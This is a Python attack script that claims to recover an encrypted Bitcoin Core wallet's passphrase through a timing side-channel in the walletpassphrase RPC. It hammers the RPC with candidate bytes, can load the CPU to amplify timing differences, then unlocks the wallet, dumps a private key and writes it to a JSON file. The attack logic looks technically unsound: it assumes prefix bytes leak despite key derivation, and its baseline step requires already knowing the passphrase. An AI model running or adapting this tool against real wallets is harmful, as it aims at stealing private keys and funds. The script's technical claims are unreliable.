#!/usr/bin/env python3
"""
padding.py — Standalone Padding Oracle Attack against Bitcoin Core's CCrypter::Decrypt

Exploits a timing side-channel in walletpassphrase RPC to recover an encrypted
wallet's passphrase byte-by-byte.  Communicates with a running bitcoind via
JSON-RPC; no C++ audit framework required.

Usage:
    python3 padding.py --rpcuser=user --rpcpassword=pass --rpcport=18443

Dependencies:
    - Python 3.9+
    - requests  (pip install requests)
    - numpy/scipy optional (pure-Python fallback included)
"""

from __future__ import annotations

import argparse
import json
import math
import os
import signal
import statistics
import sys
import threading
import time
from typing import Any, Dict, List, Optional, Tuple

try:
    import requests
except ImportError:
    sys.exit("ERROR: 'requests' library is required.  Install with:  pip install requests")

# ---------------------------------------------------------------------------
# Optional scientific libraries — fall back to pure Python if unavailable
# ---------------------------------------------------------------------------
try:
    import numpy as np

    HAS_NUMPY = True
except ImportError:
    np = None  # type: ignore[assignment]
    HAS_NUMPY = False

try:
    from scipy import stats as sp_stats

    HAS_SCIPY = True
except ImportError:
    sp_stats = None  # type: ignore[assignment]
    HAS_SCIPY = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
BANNER = r"""
╔══════════════════════════════════════════════════════════════╗
║        Bitcoin Core — Padding Oracle Attack (PoC)           ║
║  Exploits CCrypter::Decrypt timing leak via walletpassphrase║
╚══════════════════════════════════════════════════════════════╝
"""

COMMON_TEST_PASSPHRASES = [
    "audit_test_passphrase_123",
    "test_passphrase_123",
    "test",
    "password",
    "passphrase",
]


# ═══════════════════════════════════════════════════════════════════════════
# RPC Client
# ═══════════════════════════════════════════════════════════════════════════
class BitcoinRPC:
    """Minimal JSON-RPC 1.0 client for Bitcoin Core."""

    def __init__(
        self,
        user: str,
        password: str,
        host: str = "127.0.0.1",
        port: int = 18443,
        wallet: Optional[str] = None,
        timeout: float = 30.0,
    ) -> None:
        self.url = f"http://{host}:{port}"
        if wallet:
            self.url += f"/wallet/{wallet}"
        self.auth = (user, password)
        self.timeout = timeout
        self._id = 0
        self.session = requests.Session()
        self.session.auth = self.auth
        self.session.headers.update({"Content-Type": "application/json"})

    def call(self, method: str, params: Optional[List[Any]] = None) -> Any:
        """Send a JSON-RPC 1.0 request and return the 'result' field."""
        self._id += 1
        payload = {
            "jsonrpc": "1.0",
            "id": self._id,
            "method": method,
            "params": params or [],
        }
        resp = self.session.post(self.url, data=json.dumps(payload), timeout=self.timeout)
        body = resp.json()
        if body.get("error") is not None:
            raise RPCError(body["error"])
        return body.get("result")

    def timed_call(self, method: str, params: Optional[List[Any]] = None) -> Tuple[float, Any, Optional[dict]]:
        """Execute an RPC call and return (elapsed_seconds, result, error).

        Errors are returned rather than raised so callers can inspect timing
        even when the RPC itself fails (e.g. wrong passphrase).
        """
        self._id += 1
        payload = {
            "jsonrpc": "1.0",
            "id": self._id,
            "method": method,
            "params": params or [],
        }
        start = time.perf_counter()
        try:
            resp = self.session.post(self.url, data=json.dumps(payload), timeout=self.timeout)
            elapsed = time.perf_counter() - start
            body = resp.json()
            return elapsed, body.get("result"), body.get("error")
        except Exception as exc:
            elapsed = time.perf_counter() - start
            return elapsed, None, {"code": -1, "message": str(exc)}


class RPCError(Exception):
    """Raised when the Bitcoin Core RPC returns an error."""

    def __init__(self, error: dict) -> None:
        self.code: int = error.get("code", -1)
        self.message: str = error.get("message", "unknown error")
        super().__init__(f"RPC error {self.code}: {self.message}")


# ═══════════════════════════════════════════════════════════════════════════
# CPU Load Amplification
# ═══════════════════════════════════════════════════════════════════════════
class CPULoad:
    """Spawns busy-wait threads to amplify timing differences under load.

    The timing gap in CCrypter::Decrypt grows when the CPU is saturated
    because context-switch jitter magnifies the padding-check path length
    difference.
    """

    def __init__(self, threads: int = 0) -> None:
        if threads <= 0:
            cpu = os.cpu_count() or 2
            threads = max(1, cpu - 1)
        self._threads = threads
        self._workers: List[threading.Thread] = []
        self._stop = threading.Event()

    def start(self) -> None:
        """Start background busy-work threads."""
        self._stop.clear()
        for _ in range(self._threads):
            t = threading.Thread(target=self._busy, daemon=True)
            t.start()
            self._workers.append(t)

    def stop(self) -> None:
        """Signal all workers to stop and join them."""
        self._stop.set()
        for t in self._workers:
            t.join(timeout=2.0)
        self._workers.clear()

    def _busy(self) -> None:
        """Tight loop performing sqrt() to consume CPU."""
        x = 2.0
        while not self._stop.is_set():
            for _ in range(10_000):
                x = math.sqrt(x * x + 1.0)

    def __enter__(self) -> "CPULoad":
        self.start()
        return self

    def __exit__(self, *_: Any) -> None:
        self.stop()


# ═══════════════════════════════════════════════════════════════════════════
# Statistical Helpers
# ═══════════════════════════════════════════════════════════════════════════

def welch_t_test(a: List[float], b: List[float]) -> Tuple[float, float]:
    """Welch's unequal-variances t-test (two-tailed).

    Returns (t_statistic, p_value).  Uses scipy if available, otherwise
    a pure-Python implementation.
    """
    if HAS_SCIPY:
        res = sp_stats.ttest_ind(a, b, equal_var=False)
        return float(res.statistic), float(res.pvalue)
    return _welch_pure(a, b)


def _welch_pure(a: List[float], b: List[float]) -> Tuple[float, float]:
    """Pure-Python Welch's t-test."""
    n1, n2 = len(a), len(b)
    if n1 < 2 or n2 < 2:
        return 0.0, 1.0
    m1, m2 = statistics.mean(a), statistics.mean(b)
    v1, v2 = statistics.variance(a), statistics.variance(b)
    se = math.sqrt(v1 / n1 + v2 / n2) if (v1 / n1 + v2 / n2) > 0 else 1e-15
    t_stat = (m1 - m2) / se

    # Welch–Satterthwaite degrees of freedom
    num = (v1 / n1 + v2 / n2) ** 2
    denom = (v1 / n1) ** 2 / (n1 - 1) + (v2 / n2) ** 2 / (n2 - 1)
    df = num / denom if denom > 0 else 1.0

    # Approximate two-tailed p-value using the normal distribution for
    # large df; for small df this is a rough approximation but sufficient
    # for our decision threshold.
    p_value = _two_tailed_p(t_stat, df)
    return t_stat, p_value


def _two_tailed_p(t: float, df: float) -> float:
    """Approximate two-tailed p-value from t and df.

    Uses the regularised incomplete beta function when scipy is absent.
    For large df (>30) we fall back to the normal approximation.
    """
    if HAS_SCIPY:
        return float(2.0 * sp_stats.t.sf(abs(t), df))
    # Normal approximation (reasonable for df > 30)
    x = abs(t)
    # Abramowitz & Stegun 26.2.17 approximation of erfc
    p = 1.0 / (1.0 + 0.2316419 * x)
    poly = p * (0.319381530 + p * (-0.356563782 + p * (1.781477937 + p * (-1.821255978 + p * 1.330274429))))
    approx = poly * math.exp(-x * x / 2.0) / math.sqrt(2.0 * math.pi)
    return min(1.0, 2.0 * approx)


def ks_test(a: List[float], b: List[float]) -> Tuple[float, float]:
    """Two-sample Kolmogorov–Smirnov test.  Returns (statistic, p_value).

    Uses scipy when available; otherwise returns (0, 1) as a no-op.
    """
    if HAS_SCIPY:
        res = sp_stats.ks_2samp(a, b)
        return float(res.statistic), float(res.pvalue)
    return 0.0, 1.0


# ═══════════════════════════════════════════════════════════════════════════
# Timing Sampler
# ═══════════════════════════════════════════════════════════════════════════

def collect_timing_samples(
    rpc: BitcoinRPC,
    passphrase: str,
    n_samples: int,
    *,
    verbose: bool = False,
) -> List[float]:
    """Call walletpassphrase and collect *n_samples* response-time measurements.

    After each successful unlock we immediately re-lock the wallet so the
    next probe starts from a consistent state.
    """
    timings: List[float] = []
    for i in range(n_samples):
        elapsed, result, error = rpc.timed_call("walletpassphrase", [passphrase, 1])
        timings.append(elapsed)

        # If the passphrase was correct the wallet is now unlocked — lock it
        # again so subsequent probes are consistent.
        if error is None:
            try:
                rpc.call("walletlock")
            except RPCError:
                pass

        if verbose and (i + 1) % 25 == 0:
            print(f"    … collected {i + 1}/{n_samples} samples", flush=True)

    return timings


# ═══════════════════════════════════════════════════════════════════════════
# Oracle Validation (Baseline Collection)
# ═══════════════════════════════════════════════════════════════════════════

def find_valid_passphrase(
    rpc: BitcoinRPC,
    rpc_password: str,
    candidates: Optional[List[str]] = None,
) -> Optional[str]:
    """Try common test passphrases and return the first one that unlocks the wallet."""
    if candidates is None:
        candidates = list(COMMON_TEST_PASSPHRASES) + [rpc_password]
    for pp in candidates:
        try:
            rpc.call("walletpassphrase", [pp, 1])
            # Success — lock again and return
            try:
                rpc.call("walletlock")
            except RPCError:
                pass
            return pp
        except RPCError:
            continue
    return None


def collect_baselines(
    rpc: BitcoinRPC,
    valid_passphrase: str,
    n_samples: int,
    verbose: bool = False,
) -> Tuple[List[float], List[float]]:
    """Collect timing baselines for a known-valid and a known-invalid passphrase.

    Returns (valid_timings, invalid_timings).
    """
    invalid_passphrase = "\x00INVALID_PADDING_PROBE_" + os.urandom(8).hex()

    print(f"[*] Collecting {n_samples} baseline samples for VALID passphrase …")
    valid_timings = collect_timing_samples(rpc, valid_passphrase, n_samples, verbose=verbose)

    print(f"[*] Collecting {n_samples} baseline samples for INVALID passphrase …")
    invalid_timings = collect_timing_samples(rpc, invalid_passphrase, n_samples, verbose=verbose)

    return valid_timings, invalid_timings


def validate_oracle(
    valid_timings: List[float],
    invalid_timings: List[float],
    threshold: float = 3.0,
) -> Tuple[bool, float, float]:
    """Check that the timing oracle is working via Welch's t-test.

    Returns (oracle_works, t_statistic, p_value).
    """
    t_stat, p_val = welch_t_test(valid_timings, invalid_timings)
    works = abs(t_stat) > threshold
    return works, t_stat, p_val


# ═══════════════════════════════════════════════════════════════════════════
# Byte-by-Byte Recovery Engine
# ═══════════════════════════════════════════════════════════════════════════

def recover_passphrase(
    rpc: BitcoinRPC,
    invalid_baseline: List[float],
    n_samples: int,
    max_len: int = 40,
    known_prefix: str = "",
    verbose: bool = False,
    cpu_load: Optional[CPULoad] = None,
) -> Tuple[str, List[Dict[str, Any]]]:
    """Recover the wallet passphrase one byte at a time.

    For each byte position we try all 256 candidate values, collect timing
    samples, and pick the candidate whose timing distribution deviates most
    from the *invalid_baseline* (measured by Welch's t-test).

    Args:
        rpc: Connected RPC client.
        invalid_baseline: Timing samples for a known-invalid passphrase.
        n_samples: Number of timing samples per candidate.
        max_len: Maximum passphrase length to attempt.
        known_prefix: Already-recovered prefix (for resuming).
        verbose: Print per-candidate statistics.
        cpu_load: Optional CPULoad context for amplification.

    Returns:
        (recovered_passphrase, per_position_details)
    """
    recovered = list(known_prefix.encode("latin-1"))
    position_details: List[Dict[str, Any]] = []

    start_pos = len(recovered)

    for pos in range(start_pos, max_len):
        print(f"\n[*] === Recovering byte at position {pos} ===")
        best_byte: int = -1
        best_t: float = 0.0
        best_p: float = 1.0
        candidates_info: List[Dict[str, Any]] = []

        # Optionally start CPU load for this position
        if cpu_load is not None:
            cpu_load.start()

        try:
            for candidate in range(256):
                # Build test passphrase: recovered prefix + candidate byte
                test_bytes = bytes(recovered + [candidate])
                try:
                    test_passphrase = test_bytes.decode("latin-1")
                except Exception:
                    test_passphrase = test_bytes.decode("latin-1", errors="replace")

                timings = collect_timing_samples(rpc, test_passphrase, n_samples)
                t_stat, p_val = welch_t_test(timings, invalid_baseline)

                # Also run KS test if scipy is available
                ks_stat, ks_p = ks_test(timings, invalid_baseline)

                info: Dict[str, Any] = {
                    "byte_value": candidate,
                    "char": chr(candidate) if 32 <= candidate < 127 else f"\\x{candidate:02x}",
                    "mean_time": statistics.mean(timings),
                    "std_time": statistics.stdev(timings) if len(timings) > 1 else 0.0,
                    "t_statistic": t_stat,
                    "p_value": p_val,
                    "ks_statistic": ks_stat,
                    "ks_p_value": ks_p,
                }
                candidates_info.append(info)

                if verbose:
                    label = info["char"]
                    print(
                        f"    byte=0x{candidate:02x} ({label:>4s})  "
                        f"mean={info['mean_time']*1000:.3f}ms  "
                        f"t={t_stat:+.3f}  p={p_val:.4f}"
                    )

                if abs(t_stat) > abs(best_t):
                    best_t = t_stat
                    best_p = p_val
                    best_byte = candidate

        finally:
            if cpu_load is not None:
                cpu_load.stop()

        # Decision: accept the best candidate if statistically significant
        if best_p < 0.05 and best_byte >= 0:
            recovered.append(best_byte)
            display = chr(best_byte) if 32 <= best_byte < 127 else f"\\x{best_byte:02x}"
            print(
                f"[+] Position {pos}: byte=0x{best_byte:02x} ('{display}')  "
                f"t={best_t:+.3f}  p={best_p:.6f}"
            )
        else:
            # No candidate was significant — assume end of passphrase
            print(f"[*] No significant candidate at position {pos} — assuming end of passphrase.")
            break

        position_details.append(
            {
                "position": pos,
                "selected_byte": best_byte,
                "t_statistic": best_t,
                "p_value": best_p,
                "candidates": candidates_info,
            }
        )

        # Quick verification: does the recovered prefix unlock the wallet?
        try:
            partial = bytes(recovered).decode("latin-1")
            rpc.call("walletpassphrase", [partial, 1])
            # If we get here the passphrase is complete
            try:
                rpc.call("walletlock")
            except RPCError:
                pass
            print(f"[+] Passphrase fully recovered at length {len(recovered)}!")
            break
        except RPCError:
            # Not yet complete — continue
            pass

    passphrase = bytes(recovered).decode("latin-1")
    return passphrase, position_details


# ═══════════════════════════════════════════════════════════════════════════
# Verification & Key Extraction
# ═══════════════════════════════════════════════════════════════════════════

def verify_and_extract(
    rpc: BitcoinRPC,
    passphrase: str,
) -> Tuple[bool, Optional[str], Optional[str]]:
    """Verify the recovered passphrase and extract a private key as proof.

    Returns (verified, address, private_key).
    """
    try:
        rpc.call("walletpassphrase", [passphrase, 10])
    except RPCError as exc:
        print(f"[-] Verification FAILED: {exc}")
        return False, None, None

    print("[+] Passphrase verified — wallet unlocked successfully!")

    address: Optional[str] = None
    privkey: Optional[str] = None
    try:
        address = rpc.call("getnewaddress")
        print(f"[+] Generated address: {address}")
    except RPCError as exc:
        print(f"[!] Could not generate address: {exc}")

    if address:
        try:
            privkey = rpc.call("dumpprivkey", [address])
            print(f"[+] Extracted private key: {privkey}")
        except RPCError as exc:
            print(f"[!] Could not dump private key: {exc}")

    # Re-lock the wallet
    try:
        rpc.call("walletlock")
    except RPCError:
        pass

    return True, address, privkey


# ═══════════════════════════════════════════════════════════════════════════
# Result Serialisation
# ═══════════════════════════════════════════════════════════════════════════

def save_results(
    path: str,
    *,
    recovered_passphrase: str,
    verified: bool,
    address: Optional[str],
    private_key: Optional[str],
    valid_baseline: List[float],
    invalid_baseline: List[float],
    oracle_t: float,
    oracle_p: float,
    position_details: List[Dict[str, Any]],
) -> None:
    """Write all attack results and timing data to a JSON file."""
    data = {
        "recovered_passphrase": recovered_passphrase,
        "verified": verified,
        "extracted_address": address,
        "extracted_private_key": private_key,
        "oracle_validation": {
            "t_statistic": oracle_t,
            "p_value": oracle_p,
        },
        "baselines": {
            "valid_mean": statistics.mean(valid_baseline) if valid_baseline else None,
            "valid_std": statistics.stdev(valid_baseline) if len(valid_baseline) > 1 else None,
            "invalid_mean": statistics.mean(invalid_baseline) if invalid_baseline else None,
            "invalid_std": statistics.stdev(invalid_baseline) if len(invalid_baseline) > 1 else None,
            "valid_samples": valid_baseline,
            "invalid_samples": invalid_baseline,
        },
        "positions": position_details,
    }
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    print(f"[*] Results written to {path}")


# ═══════════════════════════════════════════════════════════════════════════
# CLI Entry Point
# ═══════════════════════════════════════════════════════════════════════════

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Padding Oracle Attack against Bitcoin Core's CCrypter::Decrypt timing leak.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=BANNER,
    )

    # RPC connection
    parser.add_argument("--rpcuser", required=True, help="Bitcoin Core RPC username")
    parser.add_argument("--rpcpassword", required=True, help="Bitcoin Core RPC password")
    parser.add_argument("--rpchost", default="127.0.0.1", help="RPC host (default: 127.0.0.1)")
    parser.add_argument("--rpcport", type=int, default=18443, help="RPC port (default: 18443)")
    parser.add_argument("--wallet", default=None, help="Wallet name for wallet-specific RPC")

    # Attack parameters
    parser.add_argument("--samples", type=int, default=100, help="Timing samples per candidate (default: 100)")
    parser.add_argument("--max-len", type=int, default=40, help="Maximum passphrase length (default: 40)")
    parser.add_argument("--known-prefix", default="", help="Already-recovered passphrase prefix (for resuming)")

    # CPU load amplification
    parser.add_argument(
        "--cpu-threads",
        type=int,
        default=0,
        help="Number of CPU load threads (default: 0 = auto = cpu_count - 1)",
    )
    parser.add_argument("--amplify", action="store_true", default=False, help="Enable CPU load amplification")
    parser.add_argument("--no-amplify", dest="amplify", action="store_false", help="Disable CPU load amplification")

    # Output
    parser.add_argument(
        "--output",
        default="padding_oracle_results.json",
        help="Output JSON file (default: padding_oracle_results.json)",
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output (per-byte candidate stats)")

    return parser.parse_args()


def main() -> None:
    """Main entry point — orchestrates the full padding oracle attack."""
    args = parse_args()
    print(BANNER)

    # ── 1. Connect to the node ────────────────────────────────────────────
    rpc = BitcoinRPC(
        user=args.rpcuser,
        password=args.rpcpassword,
        host=args.rpchost,
        port=args.rpcport,
        wallet=args.wallet,
    )

    print(f"[*] Connecting to bitcoind at {args.rpchost}:{args.rpcport} …")
    try:
        info = rpc.call("getblockchaininfo")
        print(f"[+] Connected — chain={info.get('chain', '?')}, blocks={info.get('blocks', '?')}")
    except Exception as exc:
        sys.exit(f"[-] Cannot reach bitcoind: {exc}")

    # ── 2. Check wallet encryption ───────────────────────────────────────
    try:
        wi = rpc.call("getwalletinfo")
    except RPCError as exc:
        sys.exit(f"[-] Cannot query wallet info: {exc}")

    unlocked_until = wi.get("unlocked_until")
    if unlocked_until is None:
        sys.exit("[-] Wallet is NOT encrypted — the padding oracle only works on encrypted wallets.")
    print("[+] Wallet is encrypted.")

    # ── 3. Find a known valid passphrase for baseline ────────────────────
    print("[*] Searching for a known valid passphrase …")
    valid_pp = find_valid_passphrase(rpc, args.rpcpassword)
    if valid_pp is None:
        sys.exit(
            "[-] Could not find a valid passphrase for baseline collection.\n"
            "    Encrypt the wallet with one of the common test passphrases,\n"
            "    or supply --known-prefix with the full passphrase for baseline."
        )
    print(f"[+] Valid passphrase found: '{valid_pp}'")

    # ── 4. Collect baselines ─────────────────────────────────────────────
    valid_timings, invalid_timings = collect_baselines(
        rpc, valid_pp, args.samples, verbose=args.verbose
    )

    v_mean = statistics.mean(valid_timings) * 1000
    i_mean = statistics.mean(invalid_timings) * 1000
    print(f"[*] Valid   baseline: mean={v_mean:.3f} ms, std={statistics.stdev(valid_timings)*1000:.3f} ms")
    print(f"[*] Invalid baseline: mean={i_mean:.3f} ms, std={statistics.stdev(invalid_timings)*1000:.3f} ms")

    # ── 5. Validate oracle ───────────────────────────────────────────────
    oracle_ok, oracle_t, oracle_p = validate_oracle(valid_timings, invalid_timings)
    print(f"[*] Oracle validation: t={oracle_t:+.3f}, p={oracle_p:.6f}")
    if oracle_ok:
        print("[+] Oracle is WORKING (|t| > 3).")
    else:
        print("[!] WARNING: Oracle signal is weak (|t| <= 3). Results may be unreliable.")

    # ── 6. Prepare CPU load amplification ────────────────────────────────
    cpu_load: Optional[CPULoad] = None
    if args.amplify:
        cpu_load = CPULoad(threads=args.cpu_threads)
        thread_count = cpu_load._threads
        print(f"[*] CPU load amplification enabled ({thread_count} threads).")

    # ── 7. Run byte-by-byte recovery ────────────────────────────────────
    print("\n" + "=" * 60)
    print("  STARTING BYTE-BY-BYTE PASSPHRASE RECOVERY")
    print("=" * 60)

    recovered, position_details = recover_passphrase(
        rpc=rpc,
        invalid_baseline=invalid_timings,
        n_samples=args.samples,
        max_len=args.max_len,
        known_prefix=args.known_prefix,
        verbose=args.verbose,
        cpu_load=cpu_load,
    )

    print("\n" + "=" * 60)
    print(f"  RECOVERED PASSPHRASE: '{recovered}'")
    print("=" * 60)

    # ── 8. Verify and extract key ────────────────────────────────────────
    verified, address, privkey = verify_and_extract(rpc, recovered)

    # ── 9. Save results ──────────────────────────────────────────────────
    save_results(
        args.output,
        recovered_passphrase=recovered,
        verified=verified,
        address=address,
        private_key=privkey,
        valid_baseline=valid_timings,
        invalid_baseline=invalid_timings,
        oracle_t=oracle_t,
        oracle_p=oracle_p,
        position_details=position_details,
    )

    # ── 10. Final summary ────────────────────────────────────────────────
    print("\n" + "=" * 60)
    print("  ATTACK SUMMARY")
    print("=" * 60)
    print(f"  Recovered passphrase : {recovered}")
    print(f"  Verified             : {'YES' if verified else 'NO'}")
    print(f"  Address              : {address or 'N/A'}")
    print(f"  Private key          : {privkey or 'N/A'}")
    print(f"  Oracle t-statistic   : {oracle_t:+.3f}")
    print(f"  Positions recovered  : {len(position_details)}")
    print(f"  Results file         : {args.output}")
    print("=" * 60)


if __name__ == "__main__":
    main()
